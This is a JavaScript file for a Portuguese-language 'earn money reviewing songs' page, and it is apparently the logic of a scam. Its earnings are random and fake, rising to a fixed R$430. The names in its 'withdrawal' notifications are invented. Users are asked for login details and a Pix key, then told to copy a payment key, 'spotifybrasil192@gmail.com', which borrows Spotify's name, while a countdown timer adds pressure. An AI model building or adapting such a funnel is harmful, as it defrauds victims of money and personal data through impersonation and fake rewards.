const loginScreen = document.getElementById('login-screen');
const reviewScreen = document.getElementById('review-screen');
const limitScreen = document.getElementById('limit-screen');
const signupScreen = document.getElementById('signup-screen');
const pixSelectionScreen = document.getElementById('pix-selection-screen');
const alertScreen = document.getElementById('alert-screen');
const activationScreen = document.getElementById('activation-screen');
const loginForm = document.getElementById('login-form');
const loginButton = document.getElementById('login-button');
const loginErrorMessage = document.getElementById('login-error-message');
const feedbackMessage = document.getElementById('feedback-message');
const email = document.getElementById('email');
const password = document.getElementById('password');
const balanceAmount = document.getElementById('balance-amount');
const submitReview = document.getElementById('submit-review');
const withdrawNow = document.getElementById('withdraw-now');
const signupForm = document.getElementById('signup-form');
const submitSignup = document.getElementById('submit-signup');
const signupErrorMessage = document.getElementById('signup-error-message');
const fullName = document.getElementById('full-name');
const signupEmail = document.getElementById('signup-email');
const pixCpf = document.getElementById('pix-cpf');
const pixPhone = document.getElementById('pix-phone');
const pixEmail = document.getElementById('pix-email');
const pixKey = document.getElementById('pix-key');
const submitPix = document.getElementById('submit-pix');
const pixErrorMessage = document.getElementById('pix-error-message');
const generatePix = document.getElementById('generate-pix');
const generatedPix = document.getElementById('generated-pix');
const copyPix = document.getElementById('copy-pix');
const copyFeedback = document.getElementById('copy-feedback');
const activateAccount = document.getElementById('activate-account');
const limitBalance = document.getElementById('limit-balance');
const alertBalance = document.getElementById('alert-balance');
const musicCover = document.getElementById('music-cover');
const musicTitle = document.getElementById('music-title');
const musicArtist = document.getElementById('music-artist');
const sliderLabel = document.getElementById('rating-slider').previousElementSibling;
const recommendNo = document.getElementById('recommend-no');
const recommendYes = document.getElementById('recommend-yes');
const ageUnder18 = document.getElementById('age-under-18');
const ageOver18 = document.getElementById('age-over-18');
const notification = document.getElementById('notification');
const gainMessage = document.getElementById('gain-message');
const moneySound = document.getElementById('money-sound');
const timerDisplay = document.getElementById('timer');

let balance = 0;
let currentMusicIndex = 0;
let reviewCount = 0;

const musicList = [
  { title: "Flowers", artist: "Miley Cyrus", cover: "https://picsum.photos/60/60?random=1" },
  { title: "Anti-Hero", artist: "Taylor Swift", cover: "https://picsum.photos/60/60?random=2" },
  { title: "As It Was", artist: "Harry Styles", cover: "https://picsum.photos/60/60?random=3" },
  { title: "Shape of You", artist: "Ed Sheeran", cover: "https://picsum.photos/60/60?random=4" },
  { title: "Umbrella", artist: "Rihanna", cover: "https://picsum.photos/60/60?random=5" },
  { title: "Rolling in the Deep", artist: "Adele", cover: "https://picsum.photos/60/60?random=6" },
  { title: "Blinding Lights", artist: "The Weeknd", cover: "https://picsum.photos/60/60?random=7" }
];

const gainValues = [50, 100, 60, 70, 10, 12, 30, 50, 40];
const targetBalance = 430;

const notificationMessages = [
  { name: "Carla", action: "sacou", item: "R$430" },
  { name: "Felipe", action: "resgatou", item: "100 créditos de música" },
  { name: "Juliana", action: "ganhou", item: "um bônus de avaliação de R$50" },
  { name: "Marcos", action: "sacou", item: "R$500" },
  { name: "Sofia", action: "resgatou", item: "um vale-presente de R$200" },
  { name: "Rafael", action: "ganhou", item: "50 créditos de música" },
  { name: "Beatriz", action: "sacou", item: "R$450" },
  { name: "Thiago", action: "resgatou", item: "um bônus especial de R$100" }
];

function goToReviewScreen() {
  console.log("Avançando para a tela de avaliação...");
  feedbackMessage.style.display = 'block';
  setTimeout(() => {
    loginScreen.classList.add('hidden');
    reviewScreen.classList.remove('hidden');
    startNotifications();
  }, 1000);
}

function startTimer() {
  let timeLeft = 19 * 60; // 19 minutos em segundos
  const timerInterval = setInterval(() => {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
    timeLeft--;
    if (timeLeft < 0) {
      clearInterval(timerInterval);
      timerDisplay.textContent = "Tempo expirado!";
    }
  }, 1000);
}

function validateLoginForm() {
  let isValid = true;
  if (!email.value.trim()) {
    email.classList.add('error');
    isValid = false;
  } else {
    email.classList.remove('error');
  }
  if (!password.value.trim()) {
    password.classList.add('error');
    isValid = false;
  } else {
    password.classList.remove('error');
  }
  if (!isValid) {
    loginErrorMessage.style.display = 'block';
  } else {
    loginErrorMessage.style.display = 'none';
  }
  return isValid;
}

function validateSignupForm() {
  let isValid = true;
  if (!fullName.value.trim()) {
    fullName.classList.add('error');
    isValid = false;
  } else {
    fullName.classList.remove('error');
  }
  if (!signupEmail.value.trim()) {
    signupEmail.classList.add('error');
    isValid = false;
  } else {
    signupEmail.classList.remove('error');
  }
  if (!isValid) {
    signupErrorMessage.style.display = 'block';
  } else {
    signupErrorMessage.style.display = 'none';
  }
  return isValid;
}

function validatePixForm() {
  let isValid = true;
  const isTypeSelected = pixCpf.classList.contains('selected') || pixPhone.classList.contains('selected') || pixEmail.classList.contains('selected');
  if (!isTypeSelected) {
    isValid = false;
  }
  if (!pixKey.value.trim()) {
    pixKey.classList.add('error');
    isValid = false;
  } else {
    pixKey.classList.remove('error');
  }
  if (!isValid) {
    pixErrorMessage.style.display = 'block';
  } else {
    pixErrorMessage.style.display = 'none';
  }
  return isValid;
}

loginForm.addEventListener('submit', (e) => {
  e.preventDefault();
  console.log("Formulário enviado.");
  if (validateLoginForm()) {
    goToReviewScreen();
  }
});

loginButton.addEventListener('click', () => {
  console.log("Botão Entrar clicado.");
  if (validateLoginForm()) {
    goToReviewScreen();
  }
});

loginButton.addEventListener('touchstart', () => {
  console.log("Botão Entrar tocado (mobile).");
  if (validateLoginForm()) {
    goToReviewScreen();
  }
});

recommendNo.addEventListener('click', () => {
  recommendNo.classList.add('selected');
  recommendYes.classList.remove('selected');
  console.log("Botão 'Não' clicado.");
});

recommendYes.addEventListener('click', () => {
  recommendYes.classList.add('selected');
  recommendNo.classList.remove('selected');
  console.log("Botão 'Sim' clicado.");
});

ageUnder18.addEventListener('click', () => {
  ageUnder18.classList.add('selected');
  ageOver18.classList.remove('selected');
  console.log("Botão '-18 anos' clicado.");
});

ageOver18.addEventListener('click', () => {
  ageOver18.classList.add('selected');
  ageUnder18.classList.remove('selected');
  console.log("Botão '+18 anos' clicado.");
});

pixCpf.addEventListener('click', () => {
  pixCpf.classList.add('selected');
  pixPhone.classList.remove('selected');
  pixEmail.classList.remove('selected');
  console.log("Botão 'CPF/CNPJ' clicado.");
});

pixPhone.addEventListener('click', () => {
  pixPhone.classList.add('selected');
  pixCpf.classList.remove('selected');
  pixEmail.classList.remove('selected');
  console.log("Botão 'Telefone' clicado.");
});

pixEmail.addEventListener('click', () => {
  pixEmail.classList.add('selected');
  pixCpf.classList.remove('selected');
  pixPhone.classList.remove('selected');
  console.log("Botão 'Email' clicado.");
});

function showGainMessage(amount) {
  gainMessage.textContent = `Você ganhou R$${amount}!`;
  gainMessage.style.display = 'block';
  setTimeout(() => {
    gainMessage.style.display = 'none';
  }, 2000);
}

function startNotifications() {
  function showNotification() {
    if (!reviewScreen.classList.contains('hidden') || !limitScreen.classList.contains('hidden')) {
      const msg = notificationMessages[Math.floor(Math.random() * notificationMessages.length)];
      notification.textContent = `${msg.name} ${msg.action} ${msg.item}!`;
      notification.style.display = 'block';
      setTimeout(showNotification, Math.random() * 5000 + 5000); // Entre 5 e 10 segundos
    }
  }
  showNotification();
}

submitReview.addEventListener('click', () => {
  reviewCount++;
  const gain = gainValues[Math.floor(Math.random() * gainValues.length)];
  balance += gain;

  balanceAmount.textContent = balance.toFixed(2).replace('.', ',');
  moneySound.play().catch(err => console.log("Erro ao reproduzir som:", err));
  showGainMessage(gain);
  currentMusicIndex = (currentMusicIndex + 1) % musicList.length;
  const music = musicList[currentMusicIndex];
  musicCover.src = music.cover;
  console.log("Tentando carregar capa:", music.cover);
  musicTitle.textContent = music.title;
  musicArtist.textContent = music.artist;
  sliderLabel.textContent = `De bom a ruim, qual nota você daria para as músicas do ${music.artist}?`;
  recommendNo.classList.remove('selected');
  recommendYes.classList.remove('selected');
  ageUnder18.classList.remove('selected');
  ageOver18.classList.remove('selected');

  if (balance >= targetBalance) {
    reviewScreen.classList.add('hidden');
    limitScreen.classList.remove('hidden');
    limitBalance.textContent = balance.toFixed(2).replace('.', ',');
    startNotifications();
  }
});

withdrawNow.addEventListener('click', () => {
  limitScreen.classList.add('hidden');
  signupScreen.classList.remove('hidden');
});

signupForm.addEventListener('submit', (e) => {
  e.preventDefault();
  console.log("Formulário de cadastro enviado.");
  if (validateSignupForm()) {
    signupScreen.classList.add('hidden');
    pixSelectionScreen.classList.remove('hidden');
  }
});

submitSignup.addEventListener('click', () => {
  console.log("Botão Prosseguir clicado.");
  if (validateSignupForm()) {
    signupScreen.classList.add('hidden');
    pixSelectionScreen.classList.remove('hidden');
  }
});

submitPix.addEventListener('click', () => {
  if (validatePixForm()) {
    pixSelectionScreen.classList.add('hidden');
    alertScreen.classList.remove('hidden');
    alertBalance.textContent = balance.toFixed(2).replace('.', ',');
  }
});

generatePix.addEventListener('click', () => {
  console.log("Botão Gerar Pix clicado.");
  generatedPix.classList.remove('hidden');
});

copyPix.addEventListener('click', () => {
  const pixKey = "spotifybrasil192@gmail.com";
  navigator.clipboard.writeText(pixKey).then(() => {
    console.log("Chave Pix copiada:", pixKey);
    copyFeedback.style.display = 'block';
    setTimeout(() => {
      copyFeedback.style.display = 'none';
    }, 2000);
  }).catch(err => {
    console.error("Erro ao copiar a chave Pix:", err);
  });
});

activateAccount.addEventListener('click', () => {
  alertScreen.classList.add('hidden');
  activationScreen.classList.remove('hidden');
  startTimer();
});